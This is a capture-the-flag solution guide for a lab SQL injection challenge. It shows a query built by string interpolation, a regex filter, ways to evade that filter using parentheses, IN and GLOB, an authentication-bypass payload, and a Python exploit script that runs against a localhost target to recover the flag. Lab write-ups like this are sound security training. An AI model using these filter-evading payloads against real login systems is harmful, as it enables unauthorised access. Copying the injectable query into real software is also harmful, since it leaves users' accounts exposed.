# A05 Easy: Solution Guide

### Vulnerability Mechanics
In `app.py`:
```python
query = f"SELECT id, username, role FROM users WHERE username = '{username}' AND password = '{password}'"
```

The WAF regex:
```python
re.compile(r"(\s|--|#|/\*|\*/|\bOR\b|\bAND\b|=|\bLIKE\b)", re.IGNORECASE)
```

### Bypass Techniques
1. **No Spaces**: Use parentheses for separation, e.g. `FROM(users)WHERE(...)`.
2. **No `=`**: Use `IN(...)` or `<` / `>`.
3. **No `OR` / `AND`**: Use subqueries with `IN(SELECT(...)WHERE(...))` or `GLOB`.
4. **Authentication Bypass Payload**:
   - `username`: `x'GLOB(SELECT('*')FROM(users)WHERE(role)IN('administrator'))GLOB'*`
   - `password`: `x'GLOB'*`

### Exploit Script
```python
import requests
import sys

TARGET = "http://127.0.0.1:6013"
session = requests.Session()

# 1. Blind extraction or direct authentication injection
u = "x'GLOB(SELECT('*')FROM(users)WHERE(role)IN('administrator'))GLOB'*"
p = "x'GLOB'*"

r = session.post(f"{TARGET}/login", data={"username": u, "password": p}, allow_redirects=True)
if "RTSA{" in r.text or "Administrator Enclave Clearance" in r.text:
    import re
    print("Flag:", re.search(r'RTSA\{.*?\}', r.text).group(0))
else:
    print("Authentication bypass failed.")
```
